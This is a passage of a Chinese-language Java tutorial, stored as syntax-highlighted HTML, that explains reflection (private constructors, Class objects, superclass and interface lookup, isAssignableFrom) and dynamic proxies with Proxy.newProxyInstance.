punctuation\">.</span></span><span class=\"token class-name\">Constructor</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rawtypes\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n\n        <span class=\"token comment\">// 获取Private的构造方法</span>\n        <span class=\"token class-name\">Constructor</span> cons3 <span class=\"token operator\">=</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cons3<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Person</span><span class=\"token punctuation\">)</span> cons3<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n\n    <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">void</span> <span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>获取继承关系</h2>\n<p>当我们获取到某个<code>Class</code>对象时，实际上就获取到了一个类的类型：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取到String的Class</span>\n</code></pre></div><p>还可以用实例的<code>getClass()</code>方法获取：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// s是String，因此获取到String的Class\\</span>\n</code></pre></div><p>最后一种获取<code>Class</code>的方法是通过<code>Class.forName(\"\")</code>，传入<code>Class</code>的完整类名获取：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>这三种方式获取的<code>Class</code>实例都是同一个实例，因为JVM对每个加载的<code>Class</code>只创建一个<code>Class</code>实例来表示它的类型。</p>\n<h3>获取父类的Class</h3>\n<p>有了<code>Class</code>实例，我们还可以获取它的父类的<code>Class</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Class</span> i <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span> n <span class=\"token operator\">=</span> i<span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span> o <span class=\"token operator\">=</span> n<span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>运行上述代码，可以看到，</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>class java.lang.Number\nclass java.lang.Object\nnull\n</code></pre></div><p><code>Integer</code>的父类类型是<code>Number</code>，<code>Number</code>的父类是<code>Object</code>，<code>Object</code>的父类是<code>null</code>。除<code>Object</code>外，其他任何非<code>interface</code>的<code>Class</code>都必定存在一个父类类型。</p>\n<h3>获取interface</h3>\n<p>由于一个类可能实现一个或多个接口，通过<code>Class</code>我们就可以查询到实现的接口类型。例如，查询<code>Integer</code>实现的接口：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Class</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> is <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getInterfaces</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span> i <span class=\"token operator\">:</span> is<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>运行上述代码可知，<code>Integer</code>实现的接口有：</p>\n<ul>\n<li>java.lang.Comparable</li>\n</ul>\n<p>Java14开始还额外有</p>\n<ul>\n<li>java.lang.constant.Constable</li>\n<li>java.lang.constant.ConstantDesc</li>\n</ul>\n<p>要特别注意：<code>getInterfaces()</code>只返回当前类直接实现的接口类型，并不包括其父类实现的接口类型：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Class</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> is <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getInterfaces</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span> i <span class=\"token operator\">:</span> is<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><code>Integer</code>的父类是<code>Number</code>，<code>Number</code>实现的接口是<code>java.io.Serializable</code>。</p>\n<p>此外，对所有<code>interface</code>的<code>Class</code>调用<code>getSuperclass()</code>返回的是<code>null</code>，获取接口的父接口要用<code>getInterfaces()</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>DataInputStream</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// java.io.FilterInputStream，因为DataInputStream继承自FilterInputStream</span>\n<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>Closeable</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// null，对接口调用getSuperclass()总是返回null，获取接口的父接口要用getInterfaces()</span>\n</code></pre></div><p>如果一个类没有实现任何<code>interface</code>，那么<code>getInterfaces()</code>返回空数组。</p>\n<h3>继承关系</h3>\n<p>当我们判断一个实例是否是某个类型时，正常情况下，使用<code>instanceof</code>操作符：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Object</span> n <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">boolean</span> isDouble <span class=\"token operator\">=</span> n <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Double</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\n<span class=\"token keyword\">boolean</span> isInteger <span class=\"token operator\">=</span> n <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n<span class=\"token keyword\">boolean</span> isNumber <span class=\"token operator\">=</span> n <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Number</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n<span class=\"token keyword\">boolean</span> isSerializable <span class=\"token operator\">=</span> n <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>Serializable</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n</code></pre></div><p>如果是两个<code>Class</code>实例，要判断一个向上转型是否成立，可以调用<code>isAssignableFrom()</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// Integer i = ?</span>\n<span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">isAssignableFrom</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true，因为Integer可以赋值给Integer</span>\n<span class=\"token comment\">// Number n = ?</span>\n<span class=\"token class-name\">Number</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">isAssignableFrom</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true，因为Integer可以赋值给Number</span>\n<span class=\"token comment\">// Object o = ?</span>\n<span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">isAssignableFrom</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true，因为Integer可以赋值给Object</span>\n<span class=\"token comment\">// Integer i = ?</span>\n<span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">isAssignableFrom</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Number</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false，因为Number不能赋值给Integer</span>\n</code></pre></div><h2>动态代理</h2>\n<p>我们来比较Java的<code>class</code>和<code>interface</code>的区别：</p>\n<ul>\n<li>可以实例化<code>class</code>（非<code>abstract</code>）；</li>\n<li>不能实例化<code>interface</code>。</li>\n</ul>\n<p>所有<code>interface</code>类型的变量总是通过某个实例向上转型并赋值给接口类型变量的：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">CharSequence</span> cs <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>有没有可能不编写实现类，直接在运行期创建某个<code>interface</code>的实例呢？</p>\n<p>这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个<code>interface</code>的实例。</p>\n<p>所谓动态代理，是和静态相对应的。我们来看静态代码怎么写：</p>\n<p>定义接口：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">void</span> <span class=\"token function\">morning</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>编写实现类：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloWorld</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">morning</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Good morning, \"</span> <span class=\"token operator\">+</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>创建实例，转型为接口并调用：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Hello</span> hello <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nhello<span class=\"token punctuation\">.</span><span class=\"token function\">morning</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>这种方式就是我们通常编写代码的方式。</p>\n<p>还有一种方式是动态代码，我们仍然先定义了接口<code>Hello</code>，但是我们并不去编写实现类，而是直接通过JDK提供的一个<code>Proxy.newProxyInstance()</code>创建了一个<code>Hello</code>接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。</p>\n<p>一个最简单的动态代理实现如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvocationHandler</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Proxy</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">InvocationHandler</span> handler <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvocationHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token annotation punctuation\">@Override</span>\n            <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> proxy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Method</span> method<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"morning\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Good morning, \"</span> <span class=\"token operator\">+</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Hello</span> hello <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Hello</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span>\n            <span class=\"token class-name\">Hello</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 传入ClassLoader</span>\n            <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span> <span class=\"token class-name\">Hello</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 传入要实现的接口</span>\n            handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 传入处理调用方法的InvocationHandler</span>\n        hello<span class=\"token punctuation\">.</span><span class=\"token function\">morning</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">void</span> <span class=\"token function\">morning</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在运行期动态创建一个<code>interface</code>实例的方法如下：</p>\n<ol>\n<li>\n<p>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用；</p>\n</li>\n<li>\n<p>通过</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Proxy.newProxyInstance()\n</code></pre></div><p>创建</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>interface\n</code></pre></div><p>实例，它需要3个参数：</p>\n<ol>\n<li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code>；</li>\n<li>需要实现的接口数组，至少需要传入一个接口进去；</li>\n<li>用来处理接口方法调用的<code>InvocationHandler</code>实例。</li>\n</ol>\n</li>\n<li>\n<p>将返回的<code>Object</code>强制转型为接口。</p>\n</li>\n</ol>\n<p>动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，它并没有什么黑魔法，把上面的动态代理改写为静态实现类大概长这样：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloDynamicProxy</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">InvocationHandler</span> handler<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">HelloDynamicProxy</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationHandler</span> handler<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>handler <span class=\"token operator\">=</span> handler<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">morning</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        handler<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>\n           <span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span>\n           <span class=\"token class-name\">Hello</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"morning\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n           <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span> name <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span 